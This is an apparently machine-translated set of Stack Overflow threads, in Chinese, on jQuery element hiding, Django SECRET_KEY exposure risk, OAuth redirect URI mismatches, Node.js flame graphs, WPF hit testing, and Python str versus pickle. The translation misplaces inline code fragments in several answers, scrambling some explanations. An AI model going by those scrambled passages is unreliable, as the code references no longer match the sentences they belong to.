我需要从我的网页中隐藏最后一个 div。

```
("div").eq(-1).hide(); 
```

我可以有工作代码吗

在此先感谢，维姬

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T19:24:00.263

你根本没有引用[jQuery](http://api.jquery.com/jQuery/)：

```
 $("div").eq(-1).hide();
//^-- missing the $ for jQuery 
```

您还可以使用更语义化的方法：

```
$("div:last").hide(); 
```

[小提琴](http://jsfiddle.net/sS7pD/) [1 小提琴2](http://jsfiddle.net/sS7pD/1/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-04T19:24:05.800

尝试

```
$("div:last").hide(); 
```

或者

```
$("div").last().hide(); 
```

我不知道`eq`带负索引，所以您唯一的问题是您在代码之前缺少`$`/ 。`jQuery`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-04T19:24:36.720

我认为问题在于行首的缺失`$`。

但你也可以使用`last`，我认为它更具可读性。这很简单：

```
$("div").last().hide(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-04T19:29:42.237

这可以解决问题：

```
$("div").last().hide() 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-01-12T02:01:04.890

首先参考jQuery。在里面添加代码`$(document).ready()`。在文档准备好之前，无法安全地操作页面。jQuery 会为您检测到这种准备状态。仅当页面文档对象模型 (DOM) 准备好执行 JavaScript 代码时，其中包含的代码`$( document ).ready()`才会运行。

```
$(document).ready(function () {
    $("div").eq(-1).hide();
}); 
```

# python - Django SECRET_KEY 风险

> ID：13221975
> 
> 赞同：8
> 
> 时间：2012-11-04T19:22:11.127
> 
> 标签：python, django

在安全方面，如果攻击者知道 SECRET_KEY，他能做什么？有没有迫在眉睫的危险？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T19:26:48.017

好吧，从[手册](https://docs.djangoproject.com/en/dev/ref/settings/#std%3asetting-SECRET_KEY)：

> 使用已知的 SECRET_KEY 运行 Django 会破坏 Django 的许多安全保护，并可能导致权限提升和远程代码执行漏洞。

我不确定它是如何做这些事情的（即究竟如何使用密钥）。很可能会导致身份验证问题。如果 Django 实际使用它以某种方式提供 https 传输，那么任何能够嗅探流量的人都可以解密流量。

# python - 获取错误：redirect_uri_mismatch 请求中的重定向 URI：http://localhost:8080/oauth2callback 与注册的重定向 URI 不匹配

> ID：13221978
> 
> 赞同：11
> 
> 时间：2012-11-04T19:22:17.590
> 
> 标签：python, google-app-engine, oauth-2.0, google-bigquery

尝试运行我的应用程序时出现此错误...

```
The redirect URI in the request: http://localhost:8080/oauth2callback did not match a registered redirect URI 
```

在 google API 控制台中，我已经注册了我的重定向网址

```
Redirect URIs:  http://localhost:8080/ 
```

在 client_secrets.json 中，我也使用与重定向 url 相同的链接，我正在关注本教程 [https://developers.google.com/bigquery/articles/dashboard#addoauth2](https://developers.google.com/bigquery/articles/dashboard#addoauth2)

编辑：

我只是对现有代码进行了一些更改

现在

```
redirect URIs in API console is     http://localhost:8080/oauth2callback 
```

这是我的 app.yaml

```
application: hellomydashboard
version: 1
runtime: python
api_version: 1

handlers:
- url: /favicon\.ico
  static_files: favicon.ico
  upload: favicon\.ico

- url: /oauth2callback
  script: oauth2client/appengine.py

- url: .*
  script: main.py 
```

现在虽然它没有显示任何错误，但它显示一个空白页。

这是我的 main.py

```
from bqclient import BigQueryClient
import httplib2
import os
from google.appengine.api import memcache
from google.appengine.ext import webapp
from google.appengine.ext.webapp.util import run_wsgi_app
from oauth2client.appengine import oauth2decorator_from_clientsecrets

# Project ID for project to receive bill.
# During limited availability preview, there is no bill.
# The value should be your quoted Client ID number 
# which you previously recorded from code.google.com/apis/console

# REPLACE THIS NUMBER WITH YOUR CLIENT ID
PROJECT_ID = "My Project ID"  #i just replaced dat
DATASET = "samples"
TABLE = "natality"

# CLIENT_SECRETS, name of a file containing the OAuth 2.0
# information for this application.
CLIENT_SECRETS = os.path.join(os.path.dirname(__file__),
    'client_secrets.json')

http = httplib2.Http(memcache)
decorator = oauth2decorator_from_clientsecrets(CLIENT_SECRETS,
    'https://www.googleapis.com/auth/bigquery')

bq = BigQueryClient(http, decorator)

class MainHandler(webapp.RequestHandler):
    @decorator.oauth_required
    def get(self):
        self.response.out.write("Hello Dashboard!\n")

application = webapp.WSGIApplication([
   ('/', MainHandler),
], debug=True)

def main():
   run_wsgi_app(application)

if __name__ == '__main__':
    main() 
```

因此，根据 main.py，如果一切正常，它必须打印 Hello Dashboard 但事实并非如此

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-04T19:25:24.673

您实际上需要将以下内容添加到重定向 URI：

```
http://localhost:8080/oauth2callback 
```

`/`此外，如果上述内容不匹配，您可能需要附加尾随：

```
http://localhost:8080/oauth2callback/ 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-07-10T22:20:12.353

使用谷歌 openId 我配置了这个

重定向 URI： [http ://domain.com/authenticate/google](http://domain.com/authenticate/google)

在[https://code.google.com/apis/console](https://code.google.com/apis/console)上，如果您没有应用，则必须创建应用，请注意必须与 url 完全匹配

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-22T05:38:28.510

在 main.py 函数中，主类添加`(decorator.callback_path, decorator.callback_handler()),`和删除

```
- url: /oauth2callback 
    script: oauth2client/appengine.py 
```

来自 app.yaml。

PS：如果你有一些代理配置/webcontent-filter，你可能会得到 DownloadError。如果您禁用这些配置或将其部署在 Google Server 上，它将正常工作。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-06-19T13:27:25.363

**当我尝试使用/Authorize**和**/authorize**时，似乎谷歌试图将 url 与区分大小写的原因相匹配，它给了我`redirect_uri_mismatch`第一个错误但对后一个有效

有人试着让我知道我是否错了

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-06-11T07:07:40.207

In main.py file,

in the part where you create a wsgi application

under `application = webapp.wsgiapplication(`

add a handler

```
(decorator.callback_path,decorator.callback_handler()), 
```

# node.js - 如何在 CentOS 上生成 Node.js 火焰图？

> ID：13221979
> 
> 赞同：7
> 
> 时间：2012-11-04T19:22:18.233
> 
> 标签：node.js, centos

我想[为我的 node.js app 生成一个火焰图](http://blog.nodejs.org/2012/04/25/profiling-node-js/)。不幸的是，我的开发箱是 OSX（不支持 utrace 助手，根据链接的文章），我的生产箱是 CentOS（甚至没有 dtrace）。

我发现一些迹象表明[SystemTap 之类的东西可能是 dtrace 的替代品](http://www.mysqlperformanceblog.com/2009/09/14/systemtap-dtrace-for-linux/)，但我一直无法拼凑出一种有效的工作方式来生成适当的 stacks.out 文件以输入到 stackvis 中。

有人知道如何启动和运行它的体面教程吗？我更喜欢在 CentOS 上使用它（这样我可以检查我的生产应用程序），但 OSX 也足够了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-09-17T22:11:33.027

在 Linux 上，perf_events 分析器可用于对堆栈跟踪进行采样，并支持 JIT 符号。对于 node.js，您需要使用 v8 选项 --perf-basic-prof 运行 0.11.13 或更高版本。该选项为 perf 使用的符号转换创建一个 /tmp/perf-PID.map 文件。使用 JavaScript 符号对堆栈跟踪进行性能分析后，您可以在“性能脚本”的输出上使用 stackcollapse-perf.pl（来自 FlameGraph 存储库）创建火焰图。

我在这里写了完整的说明：[http ://www.brendangregg.com/blog/2014-09-17/node-flame-graphs-on-linux.html](http://www.brendangregg.com/blog/2014-09-17/node-flame-graphs-on-linux.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-09T20:03:45.350

从最新的谷歌搜索来看，人们对 Centos 上的 SystemTap 不满意，但这里有一篇文章[http://dtrace.org/blogs/brendan/2012/03/17/linux-kernel-performance-flame-graphs/](http://dtrace.org/blogs/brendan/2012/03/17/linux-kernel-performance-flame-graphs/)被引用由某人的 FlameGraph github 项目[https://github.com/brendangregg/FlameGraph](https://github.com/brendangregg/FlameGraph)

我会说走向真正的解决方案，安装 dtrace 而不是依赖解决方法。

# c# - WPF Canvas 在位置是矩形

> ID：13221982
> 
> 赞同：1
> 
> 时间：2012-11-04T19:22:32.193
> 
> 标签：c#, wpf, object, wpf-controls, position

如何检查矩形对象是否位于画布中的特定位置？我发现的唯一解决方案是遍历画布中的所有孩子并检查他们的位置是否匹配，但我认为这不是一个好的解决方案。

所以我需要类似的东西`Canvas.IsRectangleAtPosition(Point x)`，有类似的东西吗？

如果没有，我该如何实现这样的方法？

亲切的问候

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:55:46.283

为了找到最顶层的 UI 元素（将获得鼠标输入的元素），您可以简单地调用[InputHitTest](http://msdn.microsoft.com/en-us/library/system.windows.uielement.inputhittest.aspx)。

```
Point pos = ...
Rectangle rect = canvas.InputHitTest(pos) as Rectangle; 
```

您也可以使用[VisualTreeHelper.HitTest](http://msdn.microsoft.com/en-us/library/ms608752.aspx)。

```
Rectangle rect = VisualTreeHelper.HitTest(canvas, pos).VisualHit as Rectangle; 
```

# python - 腌制 +str() 函数

> ID：13221987
> 
> 赞同：-3
> 
> 时间：2012-11-04T19:23:09.780
> 
> 标签：python, pickle

`Pickle`模块和功能有什么区别`+str()`？我刚刚写完下面这段代码

```
def orf(codons):
seqlist = []
flag = False
start = ['ATG']
    stop= ['TAA','TGA','TAG']
    for i in codons:
    if i in start:
        flag = True
            if flag == True:
        seqlist.append(i)
    if i in stop:
        flag = False
return seqlist

frame1 = string
codons = [frame1[i:i+3] for i in range (0, len(frame1),3)]
one = orf(codons)
seq1 =''.join(one)
output1 = 'Length of 1st open reading frame is:'+str(seq1)
#seq1 =''.join(one)
seq_list.append(seq1)
length1 = len(seq1)
output_1 = '\nSize of 1st open reading frame is:'+str(len(seq1))
length_list.append(length1)
out.write(output1)
out.write(output_1) 
```

我使用`+str()`函数来获取`(orf (codons))`字符串形式的函数。这可能使用`Pickle`. 我确实阅读了 python 教程，但无法理解它的含义。如果你能解决我的代码，我会很棒。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:45:52.870

没有`+str`功能。

您显示的代码片段包含由字符串、运算符和对 class 的调用`'Length of 1st open reading frame is:'+str(seq1)`组成的表达式。`+``str`

Pickle 是一个模块，它允许（大多数）python 对象被序列化为文件（或流）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T19:50:46.127

该`str`函数的作用与`pickle`模块完全不同。

`str`将任何 Python 对象转换为字符串，通常以人类可读或“友好”的方式（还有一个`repr`函数这样做的友好性稍低，更注重机器可读性）。所以`str([1,2,3])`返回字符串`'[1, 2, 3]'`。`str`自定义类可以通过覆盖特殊`__str__`方法来控制如何将它们转换为字符串。

`pickle`另一方面是为 Python 对象的序列化而设计的。这也可能涉及将对象转换为字符串，但它完全专注于机器可读性，而不是人工解释。事实上，从多种酸洗形式（有几种不同的协议）中获得的字符串包含不能直接作为文本查看的二进制值。（`pickle`也有各种自定义类可以绑定的钩子，但它们比 .）要复杂一些`__str__`。）

对于您的情况，`pickle`似乎不是您想要的。使用`str`将允许您将整数、列表和其他对象转换为字符串以进行打印。字符串，包括使用引号创建的文字字符串和从中获取的字符串，都`str`可以使用`+`运算符连接起来（尽管您可能需要考虑[字符串格式](http://docs.python.org/2/library/stdtypes.html#string-formatting)）。请注意，如果您已经使用该`str.join`方法将列表转换为字符串，则无需再次运行结果（正如您在问题代码中`str`所做的那样）。`seq1`